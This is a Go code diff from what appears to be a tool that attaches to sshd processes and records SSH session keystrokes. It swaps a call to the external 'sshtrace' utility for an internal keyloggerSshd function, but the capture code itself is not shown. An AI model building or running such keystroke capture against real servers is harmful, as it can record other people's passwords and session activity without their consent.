@@ -31,31 +31,15 @@ func main() {
 	handleSignal(stopCh)
 	flag.Parse()
 
-	if *pid != -1 {
-		p := Process{
-			ID:  *pid,
-			Arg: "TODO",
-		}
-		log.Printf("Logging: %d\n", *pid)
-		keyloggerSshd(stopCh, p)
-		log.Printf("Finish: %d\n", *pid)
-		return
-	}
-
 	if err := os.MkdirAll(DIR, os.ModePerm); err != nil {
 		log.Fatal(err)
 	}
 
-	procs, err := sshd()
-	if err != nil {
-		log.Fatal(err)
+	p := Process{
+		ID:  *pid,
+		Arg: "TODO",
 	}
-
-	//	p := Process{
-	//		ID:  *pid,
-	//		Arg: "hoge",
-	//	}
-	//	procs := []Process{p}
+	procs := []Process{p}
 
 	var wg sync.WaitGroup
 	for {
@@ -69,15 +53,7 @@ func main() {
 			uniqProcs.Store(p.ID, true)
 			wg.Add(1)
 			go func(p Process) {
-				//keyloggerSshd(stopCh, p)
-				cmd := exec.Command("sshtrace", "-p", strconv.Itoa(p.ID))
-				cmd.Stdout = os.Stdout
-				cmd.Stderr = os.Stderr
-				err = cmd.Run()
-				if err != nil {
-					errors.New("Command Exec Error.")
-				}
-				//fmt.Println(string(out))
+				keyloggerSshd(stopCh, p)
 				uniqProcs.Delete(p.ID)
 				wg.Done()
 			}(p)
